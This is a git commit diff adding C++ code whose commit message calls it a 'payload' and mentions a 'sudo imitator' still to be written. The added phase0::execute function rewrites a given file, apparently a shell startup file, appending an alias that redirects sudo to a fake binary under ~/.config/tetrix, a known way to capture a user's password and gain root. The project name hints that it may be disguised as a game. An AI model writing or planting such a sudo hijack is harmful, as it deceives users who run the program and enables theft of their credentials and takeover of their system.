982ffd3347e0482863a73f6034150350ac662894
Adele Reed <privacyradiator@gmail.com>
2016-11-12 16:09:14 -0800

    Finished payload, need to create sudo imitator.

--- src/phase0/phase0.cpp
+++ src/phase0/phase0.cpp
@@ -1,11 +1,33 @@
 #include "phase0.h"
+#include <fstream>
+#include <iostream>
+#include <string>
 
 phase0::phase0()
 {
 
 }
 
-int phase0::execute()
+int phase0::execute(std::string infile)
 {
 	//Adele's phase 1 code goes here.
+	std::ifstream fs(infile,std::ifstream::in);
+	std::string file="";
+	if(fs.is_open())
+	{
+		std::string line{""};
+		while(std::getline(fs,line))
+		{
+			file += line + "\n";
+		}
+	}
+	fs.close();
+	fs.clear();
+	file += "alias sudo='~/.config/tetrix/fakesudo'\n";
+
+	std::ofstream ofs(infile,std::ifstream::out);
+	ofs << file;
+	ofs.close();
+	ofs.clear();
+	//Done!
 }
--- src/phase0/phase0.h
+++ src/phase0/phase0.h
@@ -1,11 +1,12 @@
 #ifndef PHASE0_H
 #define PHASE0_H
 #include <iostream>
+#include <string>
 
 class phase0{
 	private:
 	public:
-	int execute();
+	int execute(std::string);
 	phase0();
 	~phase0();
 };
